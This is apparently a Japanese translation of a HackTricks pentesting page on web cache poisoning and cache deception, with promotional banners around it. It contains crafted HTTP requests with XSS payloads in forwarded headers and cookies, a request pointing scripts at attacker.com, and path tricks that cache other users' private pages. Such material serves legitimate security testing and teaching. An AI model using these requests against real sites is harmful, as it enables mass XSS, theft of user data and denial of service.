# キャッシュポイズニングとキャッシュデセプション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールを搭載した**ワークフローを簡単に構築し自動化**する。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 違い

> **ウェブキャッシュポイズニングとウェブキャッシュデセプションの違いは何ですか？**
>
> * **ウェブキャッシュポイズニング**では、攻撃者はアプリケーションに悪意のあるコンテンツをキャッシュに保存させ、このコンテンツが他のアプリケーションユーザーにキャッシュから提供されます。
> * **ウェブキャッシュデセプション**では、攻撃者はアプリケーションに他のユーザーの機密コンテンツをキャッシュに保存させ、攻撃者がこのコンテンツをキャッシュから取得します。

## キャッシュポイズニング

キャッシュを毒する目的は、**クライアントに攻撃者によって部分的にまたは完全に制御される予期しないリソースを読み込ませる**ことです。\
毒されたレスポンスは、キャッシュが毒されている間に影響を受けたページを訪れるユーザーにのみ提供されます。その結果、ページが人気かどうかによって、影響は存在しないから大規模まで変わります。

キャッシュポイズニング攻撃を行うには、まず**キー化されていない入力を特定**する必要があります（キャッシュされたリクエストに表示される必要がないが、返されるページを変更するパラメーター）、このパラメーターを**どのように悪用するか**を確認し、**レスポンスがキャッシュされるようにします**。

### 発見：HTTPヘッダーをチェック

通常、レスポンスが**キャッシュに保存された場合**、それを示す**ヘッダーがあります**。この投稿で注意すべきヘッダーをチェックできます：[**HTTPキャッシュヘッダー**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)。

### 発見：400コードのキャッシング

レスポンスがキャッシュに保存されていると考えている場合、**不正なヘッダーを含むリクエストを送信**してみることができます。これには**ステータスコード400**で応答されるべきです。その後、通常どおりリクエストにアクセスしてみて、**レスポンスが400ステータスコード**であれば、それが脆弱であることがわかります（さらにDoS攻撃を行うこともできます）。\
不適切に設定されたヘッダーは、ヘッダーとしての`\:`だけかもしれません。\
_この種のステータスコードがキャッシュされないことがあるので、このテストは無意味になることがあります。_

### 発見：キー化されていない入力を特定し評価する

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)を使用して、ページのレスポンスを**変更する可能性のあるパラメーターやヘッダーをブルートフォース**することができます。たとえば、ページが`X-Forwarded-For`ヘッダーを使用して、クライアントにそこからスクリプトを読み込むよう指示している場合があります：
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### バックエンドサーバーから有害なレスポンスを引き出す

パラメーター/ヘッダーが特定されたら、どのように**サニタイズ**され、どこでレスポンスに**反映**されたり影響を与えたりしているかを確認します。それを悪用できますか？（XSSを実行したり、自分が制御するJSコードを読み込んだり、DoSを実行したり...）

### レスポンスをキャッシュに保存する

悪用できる**ページ**が**特定**され、どの**パラメーター**/**ヘッダー**を使用し、どのように**悪用**するかがわかったら、そのページをキャッシュに保存する必要があります。キャッシュに保存しようとしているリソースによっては、時間がかかることがあります。数秒間試み続ける必要があるかもしれません。\
レスポンスのヘッダー**`X-Cache`**は非常に役立ちます。リクエストがキャッシュされていないときは**`miss`**の値を持ち、キャッシュされているときは**`hit`**の値を持つ可能性があります。\
ヘッダー**`Cache-Control`**も、リソースがキャッシュされているか、次にいつキャッシュされるかを知るのに興味深いです：`Cache-Control: public, max-age=1800`\
もう一つ興味深いヘッダーは**`Vary`**です。このヘッダーは、通常キーがないとされる追加のヘッダーが**キャッシュキーの一部**として扱われることを**示す**ためによく使用されます。したがって、攻撃者が狙っている被害者の`User-Agent`を知っている場合、その特定の`User-Agent`を使用しているユーザーのキャッシュを汚染することができます。\
キャッシュに関連するもう一つのヘッダーは**`Age`**です。これは、オブジェクトがプロキシキャッシュに存在していた秒数を定義します。

リクエストをキャッシュする際は、使用するヘッダーに**注意してください**。なぜなら、予期せずに**キーとして使用される**可能性があり、**被害者が同じヘッダーを使用する必要がある**からです。異なるブラウザーでキャッシュポイズニングを**テスト**し、機能しているかどうかを常に**確認**してください。

## 悪用例

### 最も簡単な例

`X-Forwarded-For`のようなヘッダーがサニタイズされずにレスポンスに反映されています>\
基本的なXSSペイロードを送信し、キャッシュを汚染することで、そのページにアクセスする全員がXSSされます：
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Webキャッシュポイズニングを使用してクッキー処理の脆弱性を悪用する

クッキーはページのレスポンスにも反映されることがあります。これを悪用してXSSを引き起こすことができれば、悪意のあるキャッシュレスポンスをロードする複数のクライアントでXSSを悪用することができるかもしれません。
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
脆弱なクッキーがユーザーによって頻繁に使用されている場合、通常のリクエストがキャッシュをクリアすることに注意してください。

### 複数のヘッダーを使用してWebキャッシュポイズニングの脆弱性を悪用する <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

時には、キャッシュを悪用するために**複数のキーでない入力を悪用する**必要があります。例えば、`X-Forwarded-Host`を自分が管理するドメインに設定し、`X-Forwarded-Scheme`を`http`に設定すると、**Open redirect**が見つかるかもしれません。**もし** **サーバー**がすべての**HTTP**リクエストを**HTTPS**に**転送**し、ヘッダー`X-Forwarded-Scheme`をリダイレクトのドメイン名として使用している場合、リダイレクトによってページが指し示される場所を制御できます。
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### 限定された`Vary`ヘッダーを利用した攻撃

**`X-Host`** ヘッダーが **JSリソースをロードするためのドメイン名** として使用されているが、レスポンスの **`Vary`** ヘッダーが **`User-Agent`** を示している場合、被害者のUser-Agentを抽出し、そのUser-Agentを使用してキャッシュを汚染する方法を見つける必要があります。
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### HTTPリクエストスマグリングを悪用したHTTPキャッシュポイズニングの悪用

[HTTPリクエストスマグリングを悪用したキャッシュポイズニング攻撃](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)の実行方法について学びます。

### Webキャッシュポイズニングの自動テスト

[Webキャッシュ脆弱性スキャナー](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)を使用して、Webキャッシュポイズニングを自動的にテストできます。多くの異なるテクニックをサポートしており、高度にカスタマイズ可能です。

使用例: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールによって動力を供給された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセス:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 脆弱な例

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATSはURL内のフラグメントを削除せずに転送し、キャッシュキーをホスト、パス、クエリのみを使用して生成しました（フラグメントは無視）。したがって、リクエスト `/#/../?r=javascript:alert(1)` はバックエンドに `/#/../?r=javascript:alert(1)` として送信され、キャッシュキーにはペイロードが含まれていませんでした。ホスト、パス、クエリのみが含まれていました。

### GitHub CP-DoS

content-typeヘッダーに不正な値を送信すると、キャッシュされた405応答がトリガーされました。キャッシュキーにはクッキーが含まれていたため、認証されていないユーザーに対してのみ攻撃が可能でした。

### GitLab + GCP CP-DoS

GitLabはGCPバケットを使用して静的コンテンツを保存しています。**GCPバケット**は**ヘッダー `x-http-method-override`**をサポートしています。したがって、ヘッダー `x-http-method-override: HEAD` を送信してキャッシュを毒され、空のレスポンスボディを返すようにすることが可能でした。また、`PURGE`メソッドもサポートしている可能性があります。

### Rack Middleware (Ruby on rails)

Ruby on RailsアプリケーションはしばしばRackミドルウェアと一緒にデプロイされます。以下のRackコードは、**`x-forwarded-scheme`の値を取り、リクエストのスキームとして使用します**。

![](<../.gitbook/assets/image (159) (2).png>)

`x-forwarded-scheme: http` ヘッダーを送信すると、同じ場所への301リダイレクトが発生し、この例のようにそのリソースに対するDoSが発生します：

![](<../.gitbook/assets/image (166).png>)

アプリケーションは `X-forwarded-host` ヘッダーもサポートしており、ユーザーをそのホストにリダイレクトし、攻撃者のサーバーからJavaScriptファイルを読み込むことが可能です：

![](<../.gitbook/assets/image (157) (2).png>)

### 403とストレージバケット

以前は、**Cloudflare**が**403レスポンス**を**キャッシュ**していたため、**S3**や**Azure Storage Blobs**にアクセスしようとする際に**不正なAuthorization**ヘッダーを送信すると、キャッシュされる403が返されました。Cloudflareはもはや403レスポンスをキャッシュしませんが、他のプロキシではこの方法が機能するかもしれません。

![](<../.gitbook/assets/image (171).png>)

### キー付きパラメータの注入

キャッシュは、キャッシュキーに**特定のGETパラメータのみを含めるように設定されている**ことがよくあります。

たとえば、Varnishを使用するFastlyはリクエスト内の**`size`パラメータ**をキャッシュしましたが、**`siz%65`**パラメータも不正な値で送信すると、**キャッシュキー**は**正しく記述されたsizeパラメータ**で構築されましたが、**バックエンド**は**URLエンコードされたパラメータ内の値**を使用しました。

![](<../.gitbook/assets/image (180).png>)

2番目の`size`パラメータをURLエンコードすると、キャッシュによって無視されましたが、バックエンドでは使用されました。パラメータに0の値を与えると、キャッシュ可能な400 Bad Requestが発生しました。

### ユーザーエージェントルール

FFUFやNucleiのようなツールが生成するトラフィックの量が多いため、一部の開発者はそれらのユーザーエージェントに一致するリクエストをブロックすることにしました。皮肉なことに、これらの調整は望ましくないキャッシュポイズニングとDoSの機会を導入する可能性があります。

![](<../.gitbook/assets/image (167) (2).png>)

この方法は、異なるツールやスキャナーからのユーザーエージェントで、複数のターゲットで機能することがわかりました。

### 不正なヘッダーフィールド

ヘッダー名の形式は[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230)で以下のように定義されています：

![](<../.gitbook/assets/image (175) (2).png>)

理論的には、ヘッダー名に**tchar**にリストされている文字以外のものが含まれている場合、400 Bad requestで拒否されるべきです。しかし、実際には、サーバーは常にRFCを尊重するわけではありません。このニュアンスを悪用する最も簡単な方法は、無効なヘッダーを拒否せず、cache-controlヘッダーが存在しない限り、400エラーをキャッシュするAkamaiをターゲットにすることでした。

![](<../.gitbook/assets/image (163).png>)

不正な文字、`\`を含むヘッダーを送信すると、キャッシュ可能な400 Bad Requestエラーが発生します。これは私のテストを通じて最も一般的に特定されたパターンの1つでした。

### 新しいヘッダーの発見

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## キャッシュデセプション

キャッシュデセプションの目的は、クライアントが**自分の機密情報を含むキャッシュに保存されるリソースを読み込むようにする**ことです。

まず、`.css`、`.js`、`.png`などの**拡張子**は通常、**キャッシュに保存されるように設定**されていることに注意してください。したがって、`www.example.com/profile.php/nonexistent.js`にアクセスすると、キャッシュは`.js`**拡張子**を見てレスポンスを保存する可能性があります。しかし、**アプリケーション**が_www.example.com/profile.php_に格納されている**機密**ユーザー情報で**応答**している場合、他のユーザーからその内容を**盗む**ことができます。

テストする他のこと：

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _あまり知られていない拡張子を使用する、例えば_ `.avif`

このライトアップで非常に明確な例が見つかります：[https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
例では、存在しないページ _http://www.example.com/home.php/non-existent.css_ を読み込むと、_http://www.example.com/home.php_ (**ユーザーの機密情報を含む**) の内容が返され、キャッシュサーバーが結果を保存すると説明されています。\
その後、**攻撃者**は _http://www.example.com/home.php/non-existent.css_ にアクセスして、以前にアクセスしたユーザーの**機密情報**を観察することができます。

キャッシュプロキシは、ファイルの拡張子（_.css_）に基づいてファイルを**キャッシュ**するように**設定**されている必要があります。例えば _http://www.example.com/home.php/non-existent.css_ は、_.css_ファイルに期待される`text/css` mimeタイプではなく、`text/html`コンテンツタイプを持つでしょう。

[HTTPリクエストスマグリングを悪用したキャッシュデセプション攻撃](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception)の実行方法についてこちらで学びます。

## 参考文献

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールによって動力を供給された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセス:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを**共有**する。

</details>
